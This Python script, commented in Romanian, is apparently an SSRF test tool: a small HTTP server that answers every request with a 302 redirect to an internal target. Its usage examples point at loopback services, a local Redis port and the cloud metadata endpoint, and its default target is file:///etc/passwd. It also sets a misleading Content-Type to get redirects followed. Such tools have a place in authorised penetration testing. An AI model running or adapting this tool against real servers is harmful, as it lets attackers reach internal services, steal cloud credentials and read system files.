#!/usr/bin/env python3
"""
Server minimal care raspunde cu 302 redirect catre o tinta interna.
Scop: testare SSRF-via-redirect (filtrul verifica doar URL-ul initial,
clientul HTTP de pe server poate urma redirectul catre o adresa
interna/loopback fara re-validare).

Ruleaza: python3 redirect_server.py <port_local> <target_url>
Exemplu: python3 redirect_server.py 8000 "http://127.0.0.1:80/"
Exemplu: python3 redirect_server.py 8000 "http://127.0.0.1:6379/"   # redis local
Exemplu: python3 redirect_server.py 8000 "http://169.254.169.254/latest/meta-data/"  # cloud metadata, daca e cazul
"""
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

TARGET = sys.argv[2] if len(sys.argv) > 2 else "file:///etc/passwd"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000


class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Request primit: {self.path} de la {self.client_address[0]}")
        self.send_response(302)
        self.send_header("Location", TARGET)
        # unele librarii verifica Content-Type inainte de a urma redirectul
        self.send_header("Content-Type", "text/csv")
        self.end_headers()

    def log_message(self, format, *args):
        pass  # print-ul custom de mai sus e suficient


if __name__ == "__main__":
    print(f"[*] Servesc pe portul {PORT}, redirect catre: {TARGET}")
    HTTPServer(("0.0.0.0", PORT), RedirectHandler).serve_forever()
